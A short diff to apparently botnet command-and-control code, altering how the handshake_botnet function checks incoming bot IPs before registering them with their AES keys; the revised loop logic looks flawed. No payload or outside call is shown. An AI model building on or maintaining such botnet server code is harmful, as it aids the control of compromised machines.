@@ -67,10 +67,12 @@ def handshake_botnet(s, ip):
            threading.Thread(target=handshake_client,args=(s, ip)).start()
         else:
          c = 0
-         for a in bots:
-          if ip != a[2]:
+         if len(bots) > 0:
+          for a in bots:
+           if ip != a[2]:c = 1; break
+           else:c = 0
+         else:
            c = 1
-          else:c = 0; break
          if c == 1:
            bots.append([s,aes_list,ip])
     except Exception as e:print(e); pass
